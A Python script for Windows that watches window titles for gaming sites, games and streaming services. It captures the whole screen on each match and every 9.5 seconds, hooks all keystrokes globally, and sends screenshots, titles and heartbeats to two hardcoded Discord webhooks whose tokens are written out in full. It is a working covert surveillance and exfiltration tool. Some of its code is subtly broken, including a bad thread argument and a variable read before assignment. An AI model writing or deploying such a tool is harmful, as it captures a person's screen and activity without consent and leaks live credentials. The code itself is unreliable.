import time
import threading
import win32gui
import pyautogui
import keyboard
import requests
import io
from datetime import datetime
from PIL import ImageGrab
import json
import traceback
import sys

# ---------------- CONFIG ---------------- #
TARGET_KEYWORDS = [
    # General game platforms
    "crazygames",
    "poki",
    "kizi",
    "y8",
    "y8 games",
    "armor games",
    "miniclip",
    "addicting games",
    "kongregate",
    "gameflare",
    "friv",
    "friv games",
    "silvergames",
    "lagged",
    "unblocked games",
    "unblocked games 66",
    "unblocked games 76",
    "unblocked games 911",
    "cool math games",
    "math playground games",

    # Popular games
    "roblox",
    "minecraft",
    "fortnite",
    "among us",
    "call of duty",
    "call of duty warzone",
    "league of legends",
    "valorant",
    "counter strike",
    "csgo",
    "dota 2",
    "overwatch",
    "genshin impact",
    "apex legends",
    "pubg",
    "clash royale",
    "clash of clans",
    "brawl stars",
    "fifa",
    "rocket league",

    # Mobile / casual games
    "subway surfers",
    "temple run",
    "geometry dash",
    "bitlife",
    "paper io",
    "slither io",
    "agar io",
    "cookie clicker",
    "idle games",
    "clicker games",

    # French / multilingual gaming phrases
    "jeux gratuits",
    "jeu gratuit",
    "jeux en ligne",
    "joue maintenant",
    "jouer en ligne",
    "spiele kostenlos",
    "online spiele",
    "juegos gratis",
    "jugar ahora",

    # Emulators & retro
    "retro games",
    "classic games",
    "arcade games",
    "flash games",
    "browser games",
    "nes games online",
    "gba games online",

    # Streaming & gaming communities
    "twitch",
    "twitch gaming",
    "kick streaming",
    "youtube gaming",
    "discord gaming",
    "steam",
    "epic games",
    "origin games",
    "battle net"
]

PASSWORD = "stop123"    # Password to toggle tracking
TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking

# Discord Webhook Configuration (BOTH WEBHOOKS)
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
PERIODIC_SCREENSHOT_INTERVAL = 9.5  # Take screenshot every 30 seconds (even without detection)
HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds

# ---------------- GLOBALS ---------------- #
lock = threading.Lock() # Thread safety
tracking_enabled = True  # Master toggle for tracking
password_buffer = ""    # Stores typed characters for password detection
last_key_time = 0       # For clearing password buffer after timeout
last_heartbeat_time = time.time()  # Track when last heartbeat was sent
last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
program_start_time = time.time()  # Track program start time
screenshot_failure_count = 0  # Track consecutive screenshot failures
max_consecutive_failures = 5  # Maximum allowed consecutive failures before warning

# Track focus state to prevent spam
current_focused_hwnd = None  # Current window handle
current_focused_title = None  # Current window title
last_alert_time = 0  # Last time we sent an alert
alert_cooldown = 60  # 60 seconds minimum between alerts for same window
recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}

def log_error(error_type, message, exception=None, additional_info=None):
    """Log errors with timestamp and details"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] [{error_type}] {message}"
    
    if exception:
        log_message += f"\nException: {str(exception)}"
        # Get full traceback for debugging
        log_message += f"\nTraceback: {traceback.format_exc()}"
    
    if additional_info:
        log_message += f"\nAdditional Info: {additional_info}"
    
    print(log_message)
    
    # Also log to file for persistent error tracking
    try:
        with open("tracker_errors.log", "a", encoding="utf-8") as log_file:
            log_file.write(log_message + "\n" + "="*80 + "\n")
    except Exception as e:
        print(f"[LOG ERROR] Failed to write to log file: {e}")

def title_matches_target(title: str) -> bool:
    title_lower = title.lower()
    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)

def get_matching_keyword(title: str) -> str:
    """Returns which keyword matched the title"""
    title_lower = title.lower()
    for keyword in TARGET_KEYWORDS:
        if keyword in title_lower:
            return keyword
    return ""

def take_screenshot():
    """Take a screenshot of the entire screen with error handling"""
    global screenshot_failure_count
    
    try:
        screenshot = ImageGrab.grab()
        if screenshot:
            screenshot_failure_count = 0  # Reset failure count on success
            return screenshot
        else:
            screenshot_failure_count += 1
            log_error("SCREENSHOT_FAILURE", "ImageGrab.grab() returned None")
            return None
    except Exception as e:
        screenshot_failure_count += 1
        log_error("SCREENSHOT_EXCEPTION", "Failed to take screenshot", e)
        
        # Check if we've had too many consecutive failures
        if screenshot_failure_count >= max_consecutive_failures:
            log_error("SCREENSHOT_CRITICAL", 
                     f"Too many consecutive screenshot failures ({screenshot_failure_count})",
                     additional_info="Consider checking display settings or permissions")
        
        return None

def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
    """Send data to a specific webhook URL with enhanced error handling"""
    try:
        if screenshot_bytes:
            # Create a new BytesIO object for each webhook
            img_byte_arr = io.BytesIO(screenshot_bytes)
            files = {
                'file': ('screenshot.png', img_byte_arr, 'image/png')
            }
            
            # Prepare multipart form data
            if 'embeds' in payload:
                data = {'payload_json': json.dumps(payload)}
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=data,
                    timeout=15  # Increased timeout for large files
                )
            else:
                # If no embeds, just send with files
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=payload,
                    timeout=15
                )
        else:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                webhook_url,
                json=payload,
                headers=headers,
                timeout=10
            )
        
        if response.status_code in [200, 204]:
            log_error("WEBHOOK_SUCCESS", f"Sent to {webhook_url[:40]}... Status: {response.status_code}")
            return True
        elif response.status_code == 429:
            # Rate limited - log and retry logic could be added here
            log_error("WEBHOOK_RATE_LIMIT", 
                     f"Rate limited by Discord: {webhook_url[:40]}...",
                     additional_info=f"Response: {response.text}")
            return False
        elif response.status_code in [401, 403, 404]:
            # Invalid webhook URL
            log_error("WEBHOOK_INVALID", 
                     f"Webhook URL may be invalid or expired: {webhook_url[:40]}...",
                     additional_info=f"Status: {response.status_code}, Response: {response.text}")
            return False
        else:
            log_error("WEBHOOK_ERROR", 
                     f"Failed to send to {webhook_url[:40]}...",
                     additional_info=f"Status: {response.status_code}, Response: {response.text}")
            return False
            
    except requests.exceptions.Timeout:
        log_error("WEBHOOK_TIMEOUT", f"Request timeout for {webhook_url[:40]}...")
        return False
    except requests.exceptions.ConnectionError:
        log_error("WEBHOOK_CONNECTION", f"Connection error for {webhook_url[:40]}... - Check internet connection")
        return False
    except Exception as e:
        log_error("WEBHOOK_EXCEPTION", f"Unexpected error for {webhook_url[:40]}...", e)
        return False

def send_to_all_webhooks(payload, screenshot=None):
    """Send message to all configured webhooks with failure tracking"""
    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        log_error("CONFIG_ERROR", "No webhooks configured or all are default URLs")
        return False
    
    success_count = 0
    failed_webhooks = []
    threads = []
    
    # Convert screenshot to bytes once
    screenshot_bytes = None
    if screenshot and SEND_SCREENSHOTS:
        try:
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
            
            # Add screenshot info to payload
            if 'embeds' in payload:
                if 'content' not in payload or not payload['content']:
                    payload['content'] = "📸 **Screenshot captured below:**"
        except Exception as e:
            log_error("SCREENSHOT_PROCESSING", "Failed to process screenshot for webhooks", e)
            screenshot_bytes = None
    elif screenshot is None and SEND_SCREENSHOTS:
        log_error("SCREENSHOT_MISSING", "Screenshot was None but SEND_SCREENSHOTS is True")
    
    for webhook_url in DISCORD_WEBHOOKS:
        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            failed_webhooks.append(f"{webhook_url[:40]}... - Invalid/Default URL")
            continue
            
        # Create thread for each webhook
        if screenshot_bytes:
            thread = threading.Thread(
                target=process_webhook_send,
                args=(webhook_url, payload, screenshot_bytes, failed_webhooks),
                kwargs={'success_counter': lambda: None}
            )
        else:
            thread = threading.Thread(
                target=process_webhook_send,
                args=(webhook_url, payload, None, failed_webhooks),
                kwargs={'success_counter': lambda: None}
            )
        
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for i, thread in enumerate(threads):
        try:
            thread.join(timeout=20)  # 20 second timeout per webhook
            
            # Check if thread completed successfully
            if not thread.is_alive():
                success_count += 1
            else:
                log_error("WEBHOOK_THREAD_TIMEOUT", f"Thread for webhook {i+1} timed out")
        except Exception as e:
            log_error("WEBHOOK_THREAD_ERROR", f"Error joining thread for webhook {i+1}", e)
    
    # Log summary
    if success_count > 0:
        log_error("WEBHOOK_SUMMARY", f"Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
    else:
        log_error("WEBHOOK_ALL_FAILED", "Failed to send to all webhooks", 
                 additional_info=f"Failed webhooks: {', '.join(failed_webhooks)}")
    
    return success_count > 0

def process_webhook_send(webhook_url, payload, screenshot_bytes, failed_webhooks):
    """Process webhook sending in thread"""
    success = send_to_webhook(webhook_url, payload, screenshot_bytes)
    if not success:
        failed_webhooks.append(f"{webhook_url[:40]}...")

def send_discord_alert(title, keyword, screenshot=None):
    """Send alert to Discord webhooks with optional screenshot"""
    try:
        # Prepare the message
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        embed = {
            "title": "⚠️ Target Application Detected",
            "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`",
            "color": 16711680,  # Red color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"🚨 **Target detected:** {title[:100]}"
        }
        
        success = send_to_all_webhooks(payload, screenshot)
        
        if not success and screenshot is None:
            log_error("ALERT_NO_SCREENSHOT", 
                     "Alert sent but screenshot was not included",
                     additional_info=f"Title: {title}, Keyword: {keyword}")
        
        return success
        
    except Exception as e:
        log_error("ALERT_SEND_ERROR", "Failed to send Discord alert", e,
                 additional_info=f"Title: {title}, Keyword: {keyword}")
        return False

def send_discord_status(status):
    """Send tracking status to Discord"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
        
        embed = {
            "title": f"🔄 Tracking {status}",
            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
            "color": color,
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📊 **Tracker Status Changed**"
        }
        
        return send_to_all_webhooks(payload)
        
    except Exception as e:
        log_error("STATUS_SEND_ERROR", "Failed to send status update", e)
        return False

def send_heartbeat():
    """Send heartbeat webhook to confirm PC is active"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime_seconds = int(time.time() - program_start_time)
        
        # Convert uptime to readable format
        hours = uptime_seconds // 3600
        minutes = (uptime_seconds % 3600) // 60
        seconds = uptime_seconds % 60
        
        embed = {
            "title": "💓 PC Heartbeat",
            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Screenshot Failures:** `{screenshot_failure_count} consecutive`",
            "color": 3447003,  # Blue color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed]
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            log_error("HEARTBEAT_SUCCESS", f"Heartbeat sent successfully at {current_time}")
        else:
            log_error("HEARTBEAT_FAILED", f"Heartbeat failed to send at {current_time}")
        return success
            
    except Exception as e:
        log_error("HEARTBEAT_ERROR", "Failed to send heartbeat", e)
        return False

def send_periodic_screenshot():
    """Send periodic screenshot to Discord (every 30 seconds) with enhanced error handling"""
    try:
        # Get current window info even if not a target
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd).strip()
        except Exception as e:
            log_error("WINDOW_INFO_ERROR", "Failed to get window information", e)
            title = "Unknown Window"
        
        if not title:
            title = "No window title"
        
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Take screenshot
        screenshot = None
        if SEND_SCREENSHOTS:
            screenshot = take_screenshot()
            if screenshot is None:
                log_error("PERIODIC_SCREENSHOT_FAILED", 
                         f"Failed to take periodic screenshot for window: '{title[:50]}...'",
                         additional_info=f"Screenshot failure count: {screenshot_failure_count}")
        
        # Prepare message
        embed = {
            "title": "⏰ Periodic Screenshot",
            "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**Screenshot Status:** `{'✓ Captured' if screenshot else '✗ Failed'}`",
            "color": 10181046,  # Purple color
            "footer": {
                "text": "Tracker System - Periodic Capture"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📸 **Periodic screenshot {'captured' if screenshot else 'FAILED - check logs'}**"
        }
        
        success = send_to_all_webhooks(payload, screenshot)
        if success:
            log_error("PERIODIC_SUCCESS", f"Sent periodic screenshot at {current_time} (Window: '{title[:50]}...')")
        else:
            log_error("PERIODIC_WEBHOOK_FAILED", f"Failed to send periodic screenshot to webhooks")
        return success
            
    except Exception as e:
        log_error("PERIODIC_ERROR", "Unexpected error in periodic screenshot", e)
        return False

def send_startup_message():
    """Send webhook when the program starts"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get system info for debugging
        import platform
        system_info = f"Python {sys.version.split()[0]} on {platform.system()} {platform.release()}"
        
        embed = {
            "title": "🚀 Tracker Started",
            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**System:** `{system_info}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Screenshots:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**Webhooks Configured:** `{len([wh for wh in DISCORD_WEBHOOKS if wh and wh != 'YOUR_DISCORD_WEBHOOK_URL_HERE'])}`",
            "color": 3066993,  # Green color
            "footer": {
                "text": "Tracker System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": "📱 **System Online** - Tracker is now active"
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            log_error("STARTUP_SUCCESS", f"Startup message sent to all webhooks at {current_time}")
        else:
            log_error("STARTUP_FAILED", f"Failed to send startup message to webhooks")
        return success
            
    except Exception as e:
        log_error("STARTUP_ERROR", "Failed to send startup message", e)
        return False

def toggle_tracking():
    """Toggle tracking on/off"""
    global tracking_enabled, password_buffer, recently_alerted_windows
    tracking_enabled = not tracking_enabled
    status = "ENABLED" if tracking_enabled else "DISABLED"
    log_error("TRACKING_TOGGLE", f"Tracking {status}")
    
    # Clear recently alerted windows when toggling
    recently_alerted_windows.clear()
    
    # Send Discord notification about status change
    threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
    
    password_buffer = ""  # Clear password buffer

def on_key_event(e):
    """Handle keyboard events for password detection"""
    global password_buffer, last_key_time
    
    # Ignore modifier keys and non-character keys
    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
        return
    
    current_time = time.time()
    
    # Clear buffer if too much time passed between keystrokes (2 seconds)
    if current_time - last_key_time > 2:
        password_buffer = ""
    
    last_key_time = current_time
    
    # Handle backspace
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'backspace':
            password_buffer = password_buffer[:-1]
        elif e.name == 'space':
            password_buffer += ' '
        elif len(e.name) == 1:  # Regular character
            password_buffer += e.name
        elif e.name == 'enter':  # Enter key submits password
            check_password()
            return
    
    # Check password continuously (without needing Enter)
    check_password()
    
    # Keep buffer from growing too large
    if len(password_buffer) > 20:
        password_buffer = password_buffer[-20:]

def check_password():
    """Check if password buffer contains the password"""
    global password_buffer
    if PASSWORD in password_buffer:
        log_error("PASSWORD_DETECTED", f"Password '{PASSWORD}' detected, toggling tracking")
        toggle_tracking()
        password_buffer = ""  # Clear after successful match

def setup_keyboard_listener():
    """Setup global keyboard listeners"""
    try:
        # Hotkey to toggle tracking
        keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
        log_error("HOTKEY_REGISTERED", f"Hotkey '{TOGGLE_HOTKEY}' registered for toggling tracking")
        log_error("PASSWORD_SETUP", f"Password '{PASSWORD}' configured for toggling tracking")
        
        # General key listener for password typing
        keyboard.hook(on_key_event, suppress=False)
        
        return keyboard
    except Exception as e:
        log_error("KEYBOARD_SETUP_ERROR", "Failed to setup keyboard listeners", e)
        return None

def should_send_alert(hwnd, title, keyword):
    """Check if we should send an alert for this window"""
    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
    
    current_time = time.time()
    
    # Clean up old entries from recently_alerted_windows
    to_remove = []
    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
            to_remove.append(window_hwnd)
    
    for hwnd_key in to_remove:
        del recently_alerted_windows[hwnd_key]
    
    # Check if this is a new focus or different window
    if hwnd == current_focused_hwnd and title == current_focused_title:
        # Same window still focused, check cooldown
        if current_time - last_alert_time < alert_cooldown:
            return False  # Still in cooldown period
        
        # Check if we've already alerted for this window recently
        if hwnd in recently_alerted_windows:
            window_title, last_alert = recently_alerted_windows[hwnd]
            if current_time - last_alert < alert_cooldown:
                return False  # Already alerted for this window recently
    
    # Update focus tracking
    current_focused_hwnd = hwnd
    current_focused_title = title
    
    # Record this alert
    recently_alerted_windows[hwnd] = (title, current_time)
    last_alert_time = current_time
    
    return True

# ---------------- HEARTBEAT THREAD ---------------- #
def heartbeat_monitor():
    """Periodically send heartbeat every 5 minutes"""
    global last_heartbeat_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to send heartbeat
            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
                log_error("HEARTBEAT_TRIGGERED", "Sending heartbeat...")
                threading.Thread(target=send_heartbeat, daemon=True).start()
                last_heartbeat_time = current_time
            
            # Sleep for 1 minute and check again
            time.sleep(60)
            
        except Exception as e:
            log_error("HEARTBEAT_MONITOR_ERROR", "Error in heartbeat monitor", e)
            time.sleep(60)

# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
def periodic_screenshot_monitor():
    """Periodically take screenshots every 30 seconds"""
    global last_periodic_screenshot_time
    
    while True:
        try:
            current_time = time.time()
            
            # Check if it's time to take periodic screenshot
            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
                tracking_enabled and SEND_SCREENSHOTS):
                
                log_error("PERIODIC_TRIGGERED", "Taking periodic screenshot...")
                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
                last_periodic_screenshot_time = current_time
                
            # Sleep for 1 second and check again
            time.sleep(1)
            
        except Exception as e:
            log_error("PERIODIC_MONITOR_ERROR", "Error in periodic screenshot monitor", e)
            time.sleep(1)

# ---------------- MAIN LOOP ---------------- #
def main_loop():
    """Main monitoring loop with comprehensive error handling"""
    global tracking_enabled
    
    log_error("SYSTEM_START", "Monitoring started...")
    log_error("SYSTEM_CONFIG", f"Tracking is {'ENABLED' if tracking_enabled else 'DISABLED'} by default")
    log_error("SYSTEM_CONFIG", f"Alert cooldown: {alert_cooldown} seconds per window")
    log_error("SYSTEM_CONFIG", f"Periodic screenshots: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds")
    log_error("SYSTEM_CONFIG", f"Screenshot sending: {'ENABLED' if SEND_SCREENSHOTS else 'DISABLED'}")
    
    # Send startup webhook immediately
    if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        log_error("STARTUP_INIT", f"Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
        threading.Thread(target=send_startup_message, daemon=True).start()
        
        # Start heartbeat monitor in a separate thread
        heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
        heartbeat_thread.start()
        log_error("HEARTBEAT_STARTED", f"Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
        
        # Start periodic screenshot monitor in a separate thread
        periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
        periodic_thread.start()
        log_error("PERIODIC_STARTED", f"Periodic screenshot monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
    else:
        log_error("CONFIG_WARNING", "No webhooks configured - skipping startup and heartbeat messages")
    
    # Test Discord connections
    valid_webhooks = []
    for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
        if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
            log_error("WEBHOOK_CHECK", f"Webhook {i} configured: {webhook_url[:50]}...")
            try:
                if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                    log_error("WEBHOOK_VALID", f"Webhook {i} URL format is valid")
                    valid_webhooks.append(webhook_url)
                else:
                    log_error("WEBHOOK_WARNING", f"Webhook {i} has unusual format")
                    valid_webhooks.append(webhook_url)
            except Exception as e:
                log_error("WEBHOOK_TEST_ERROR", f"Could not test webhook {i}", e)
                valid_webhooks.append(webhook_url)
    
    if valid_webhooks:
        log_error("WEBHOOK_SUMMARY", f"{len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid")
    else:
        log_error("CONFIG_ERROR", "No valid webhooks configured - skipping Discord alerts")
    
    # Setup keyboard listener
    kb_listener = setup_keyboard_listener()
    if not kb_listener:
        log_error("CRITICAL_ERROR", "Failed to setup keyboard listener - exiting")
        return
    
    try:
        while True:
            # Only process tracking if enabled
            if tracking_enabled:
                try:
                    hwnd = win32gui.GetForegroundWindow()
                    title = win32gui.GetWindowText(hwnd).strip()

                    if not title:
                        time.sleep(0.05)
                        continue

                    # Detect target
                    detected = title_matches_target(title)

                    if detected:
                        keyword = get_matching_keyword(title)
                        
                        # Check if we should send an alert for this window
                        if should_send_alert(hwnd, title, keyword):
                            log_error("DETECTION", f"Target detected: '{title}' (Keyword: {keyword})")
                            
                            # Small delay before taking screenshot to ensure window is focused
                            time.sleep(SCREENSHOT_DELAY)
                            
                            # Take screenshot in main thread
                            screenshot = None
                            if SEND_SCREENSHOTS:
                                screenshot = take_screenshot()
                                if screenshot is None:
                                    log_error("SCREENSHOT_ALERT_FAILED", 
                                             f"Failed to take screenshot for detected target: '{title}'",
                                             additional_info=f"Keyword: {keyword}, Failure count: {screenshot_failure_count}")
                            
                            # Send alert to both webhooks
                            alert_thread = threading.Thread(
                                target=send_discord_alert,
                                args=(title, keyword, screenshot),
                                daemon=True
                            )
                            alert_thread.start()
                        else:
                            # Debug logging for skipped alerts
                            if hwnd == current_focused_hwnd:
                                log_error("ALERT_SKIPPED", f"Already alerted for this window recently: '{title[:50]}...'")
                    else:
                        # Not a target window, update focus tracking
                        current_focused_hwnd = hwnd
                        current_focused_title = title

                except Exception as e:
                    log_error("MAIN_LOOP_ERROR", "Error in main detection loop", e)
            
            # Sleep regardless of tracking state
            time.sleep(0.1)

    except KeyboardInterrupt:
        log_error("SYSTEM_STOP", "Program interrupted by user")
    except Exception as e:
        log_error("CRITICAL_ERROR", "Unexpected error in main loop", e)
    finally:
        # Cleanup
        try:
            keyboard.unhook_all()
            log_error("SYSTEM_CLEANUP", "Keyboard listeners stopped")
        except Exception as e:
            log_error("CLEANUP_ERROR", "Error during cleanup", e)
        
        log_error("SYSTEM_END", "Program ended")

# Start the main loop
if __name__ == "__main__":
    main_loop()
